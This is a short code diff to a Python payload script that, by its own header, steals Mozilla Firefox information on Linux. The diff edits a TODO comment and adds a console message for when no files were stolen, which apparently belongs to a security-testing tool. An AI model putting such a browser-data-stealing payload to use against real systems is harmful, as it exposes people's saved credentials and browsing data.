@@ -1,6 +1,6 @@
 #REQUIRE_LINUX
 #This payload steals Mozilla Firefox information
-#TODO: Provide support for downloading
+#TODO: Provide support for downloading files
 import re
 
 result = []
@@ -39,3 +39,5 @@ for file in files:
         result.append(read(file))
 
 result = [p for p in result if p != '']
+if result == [ ]:
+    console('Stealing files didnt work, Server is configured correctly')
